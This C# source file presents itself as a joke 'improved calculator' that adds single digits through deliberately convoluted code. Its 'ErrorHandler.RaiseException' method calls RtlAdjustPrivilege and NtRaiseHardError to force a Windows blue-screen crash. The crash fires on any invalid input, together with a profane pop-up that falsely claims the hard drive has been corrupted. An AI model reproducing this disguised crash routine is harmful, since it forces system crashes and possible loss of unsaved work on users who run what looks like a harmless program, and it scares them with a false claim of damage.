using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Linq.Expressions;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Threading.Tasks;


namespace Project
{

    public static class TypeBasedInspection
    {
        public static string GetDataStorageContainerName<T>(Expression<Func<T>> memberExpression)
        {
            MemberExpression expressionBody = (MemberExpression)memberExpression.Body;
            return expressionBody.Member.Name;
        }
    }

    public static class ErrorHandler{
        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        public static unsafe void RaiseException()
        {
            Boolean t1;
            uint t2;
            RtlAdjustPrivilege(19, true, false, out t1);
            NtRaiseHardError(0xdeadbeef, 0, 0, IntPtr.Zero, 6, out t2);
        }
    }

    internal class Program
    {

        public static Dictionary<string,int> GLOBALS = new Dictionary<string,int>();

        public static int DoLogic(int input, int input2) { 
            List<int> cached_first_digits = first_digits.ToList();

            if (input != cached_first_digits[input2]) {
                return -1;
            } else {
                return (int) Math.Sqrt((((Math.Pow(input, 2) * 981) + 582.982816) - (1141.965632 * 2 / 4 + 12)) / (245.25 * 4));
            }
        }

        public static int[] first_digits = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9};
        public static List<int> second_digits = new List<int>(){9, 8, 7, 6, 5, 4, 3, 2, 1, 0}; 

        public static int GetSum(int a, int b){
            int counter_a = 0;

            do {
                int condition = DoLogic(counter_a, a);
                if (DoLogic(counter_a, a) != -1){
                    int num1 = DoLogic(counter_a, a);  
                    GLOBALS.Add(TypeBasedInspection.GetDataStorageContainerName(() => num1), num1);  
                    break;    
                } else if (condition == -1){
                    counter_a++;
                    continue;
                }
            } while (true);

            // First Number
            int i = first_digits[GLOBALS[Encoding.UTF8.GetString(Convert.FromBase64String("bnVtMQ=="))]];
            var second_digits_2 = second_digits;
            int x = second_digits_2[b]; // Second Number
            int n = 0;
            while(n < i) {
                x = x * (x + 1)/ x; // increment by 1
                n++; 
            }
            GLOBALS.Clear();
            return x;
        }

        static void Main(string[] args)
        {
            
            Console.WriteLine("Welcome to the improved calculator [64-bit Windows Edition] \n    (v1.37.116.100.0.4896.85 (Official Build) STABLE BRANCH):\n\n~> The calculator of the future [Now With Number Adding Technology!] <~");
            Thread.Sleep(1000);
            Console.Write("Loading Algorithms");
            Thread.Sleep(732);
            Console.Write(".");
            Thread.Sleep(500);
            Console.Write(".");
            second_digits.Reverse();second_digits.Reverse();second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse(); second_digits.Reverse();
            Thread.Sleep(5000);
            Console.Write(".");
            Thread.Sleep(4500);
            Console.WriteLine("\n");
            while (true) {
                int Number1;
                int Number2;
                try {
                    Console.Write("Enter your first number: ");
                    Number1 = Int32.Parse(Console.ReadLine());

                    Console.Write("Enter your second number: ");
                    Number2 = Int32.Parse(Console.ReadLine());
                } catch {
                    ErrorHandler.RaiseException();
                    break;
                }

                if (Number1 > 9 || Number2 > 9 || Number1 < 0 || Number2 < 0){
                    Task.Factory.StartNew(() =>
                    {
                        MessageBox.Show("Dude what the fuck did you do?! \n\nYou can't add 2 digit or negative numbers!!! Fuck shit shit shit fuck oh fucking shit! YOU JUST CORRUPTED YOUR ENTIRE HARD DRIVE DUMBASS!", "Uh Oh...", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
                    });
                    ErrorHandler.RaiseException();
                }

                Console.WriteLine("\n>     " + Number1.ToString() + " + " + Number2.ToString() + " = " + GetSum(Number1, Number2).ToString());
                Console.Write("\nPress any key to continue...");
                Console.ReadKey(false);
                Console.WriteLine("\n\n\n");

            }
        }
    }
}